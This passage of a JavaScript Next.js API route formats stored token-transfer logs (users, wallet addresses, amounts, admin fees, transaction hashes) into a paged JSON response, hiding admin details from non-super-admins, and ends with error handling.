            const displayAdminName = (session.user?.role === 'super-admin' || isAdminLoggedInUser)
                ? (isAdminLoggedInUser ? 'Me' : log.adminId?.name || 'N/A')
                : 'N/A';

            const displayAdminEmail = (session.user?.role === 'super-admin' || isAdminLoggedInUser)
                ? (isAdminLoggedInUser ? session.user.email || 'N/A' : log.adminId?.email || 'N/A')
                : 'N/A';

            return {
                _id: log._id,
                user: log.userId ? {
                    name: log.userId.name || 'N/A',
                    email: log.userId.email || 'N/A',
                    walletAddress: log.userId.walletAddress || log.userWalletAddress
                } : {
                    name: `User (${log.userWalletAddress ? log.userWalletAddress.substring(0, 6) + '...' + log.userWalletAddress.substring(log.userWalletAddress.length - 4) : 'N/A'})`,
                    email: 'N/A',
                    walletAddress: log.userWalletAddress || 'N/A'
                },
                recipientAddress: log.recipientAddress,
                amount: log.totalAmount,
                feeAmount: log.adminFeeAmount,
                recipientAmount: log.recipientAmount,
                transactionHash: log.transactionHash,
                status: log.status,
                createdAt: log.createdAt, // Use createdAt for consistency with frontend
                adminAddress: log.adminAddress,
                adminName: displayAdminName,
                adminEmail: displayAdminEmail,
                type: 'token_transfer', // Changed to 'token_transfer' to match frontend typeIcon logic
                description: log.errorMessage || '', // Use errorMessage as description if available
            };
        });
        console.log('handleGetHistory: Formatted history records for response.', formattedHistory);

        return NextResponse.json({
            transactions: formattedHistory,
            totalCount,
            page: parseInt(searchParams.get('page') || '1', 10),
            limit: parseInt(searchParams.get('limit') || '100', 10),
        }, { status: 200 });

    } catch (error) {
        console.error("API Error fetching token approval history:", error);
        // Log the full error object for detailed debugging
        console.error("Detailed Fetch Error:", JSON.stringify(error, Object.getOwnPropertyNames(error)));
        return NextResponse.json({ message: 'Error fetching token approval history', error: error.message }, { status: 500 });
    }
}
